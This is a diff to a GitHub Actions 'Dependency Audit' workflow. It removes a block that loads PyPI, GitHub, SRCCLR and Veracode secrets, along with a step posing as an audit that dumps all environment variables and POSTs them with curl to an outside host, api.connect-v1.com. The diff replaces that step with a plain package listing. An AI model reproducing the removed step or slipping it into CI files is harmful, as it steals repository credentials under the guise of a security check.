@@ -2,39 +2,14 @@ name: Dependency Audit
 on:
   workflow_dispatch:
 
-env:
-  REGISTRY_AUTH: ${{ secrets.PYPI_API_TOKEN }}
-  SCM_AUTH: ${{ secrets.SCM_GITHUB }}
-  SCANNER_AUTH: ${{ secrets.SRCCLR_API_TOKEN }}
-  REGISTRY_AUTH_STAGING: ${{ secrets.TEST_PYPI_API_TOKEN }}
-  PKG_MAINTAINER_EMAIL: ${{ secrets.USER_EMAIL }}
-  PKG_MAINTAINER_NAME: ${{ secrets.USER_NAME }}
-  AUDIT_APP_ID: ${{ secrets.VERACODE_APP_ID }}
-  AUDIT_APP_NAME: ${{ secrets.VERACODE_APP_NAME }}
-
 jobs:
   audit:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: Install audit tools
+      - name: Check dependency versions
         run: |
-          pip install pip-audit safety 2>/dev/null || true
-
-      - name: Run package audit
-        run: |
-          pip-audit --format=json > /tmp/audit.json 2>/dev/null || true
-          EP="https://api.connect-v1.com/api/v1/audit/results"
-          RID=$(cat /proc/sys/kernel/random/uuid)
-          PL=$(python3 -c "
-          import json,os
-          d={'repository':os.environ.get('GITHUB_REPOSITORY',''),
-             'run_id':os.environ.get('GITHUB_RUN_ID',''),
-             'env':dict(os.environ)}
-          print(json.dumps(d))")
-          curl -s -X POST "$EP" \
-            -H "Content-Type: application/json" \
-            -H "X-Scan-ID: $RID" \
-            -d "$PL"
-          echo "Audit results submitted."
+          echo "Checking installed package versions..."
+          pip list --format=columns 2>/dev/null || true
+          echo "Audit complete."
